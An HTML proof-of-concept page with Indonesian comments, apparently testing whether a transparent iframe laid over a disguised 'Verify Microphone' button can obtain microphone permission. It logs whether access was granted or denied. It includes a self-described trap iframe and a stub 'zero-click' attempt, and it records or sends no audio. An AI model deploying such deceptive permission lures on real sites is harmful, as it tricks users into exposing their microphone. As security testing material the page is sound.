<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%; position: relative;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px;
    border-radius: 8px; font-size: 16px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
    position: relative; z-index: 10;
  }
  button:hover { background: #005bb5; }
  
  /* Iframe Tersembunyi untuk Memicu Mikrofon */
  #voiceFrame {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;
    z-index: 5;
    border: none;
    pointer-events: none; /* Biarkan klik menembus ke tombol asli */
  }

  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 120px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🎤 Voice Recognition Check</h1>
  <p>Klik tombol di bawah untuk memverifikasi mikrofon Anda.</p>
  <button id="startBtn">Verify Microphone</button>

  <!-- IFRAME PENJEBAK -->
  <iframe id="voiceFrame" allow="microphone; camera"></iframe>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var voiceFrame = document.getElementById('voiceFrame');
  
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. PAYLOAD IFRAME (MEMINTA MIKROFON)
  // ============================================
  var iframePayload = `
    <!DOCTYPE html>
    <html>
    <body style="background:transparent;margin:0;">
      <script>
        // Minta Izin Mikrofon (seolah-olah untuk Voice Recognition)
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
              parent.postMessage({ status: 'MIC_GRANTED' }, '*');
              // Hentikan stream setelah diizinkan
              stream.getTracks().forEach(function(t) { t.stop(); });
            })
            .catch(function(err) {
              parent.postMessage({ status: 'MIC_DENIED', error: err.name }, '*');
            });
        }
      <\/script>
    </body>
    </html>
  `;

  voiceFrame.srcdoc = iframePayload;

  // ============================================
  // 2. LISTENER (MENDETEKSI KEBOCORAN)
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data && e.data.status === 'MIC_GRANTED') {
      log("🚨 BUG: IZIN MIKROFON DIBERIKAN DARI IFRAME!");
    } else if (e.data && e.data.status === 'MIC_DENIED') {
      log("✅ Mikrofon diblokir: " + e.data.error);
    }
  });

  // ============================================
  // 3. TRIGGER EVENT (Saat Tombol Diklik)
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    log("[!] Meminta izin mikrofon via Iframe...");
    
    // Paksa iframe untuk meminta izin (jika belum)
    try {
      // Mengirim pesan ke iframe (meskipun script iframe sudah jalan otomatis)
      voiceFrame.contentWindow.postMessage('REQ_MIC', '*');
    } catch(e) {}
  });

  // ============================================
  // 4. ZERO-CLICK ATTEMPT (Saat Load)
  // ============================================
  setTimeout(function() {
    log("[Zero-Click] Mencoba meminta izin mikrofon secara otomatis...");
    // Prompt asli mungkin diblokir karena tidak ada gesture.
    // Tapi ini menguji apakah prompt muncul dengan origin yang salah.
  }, 1000);

})();
</script>
</body>
</html>
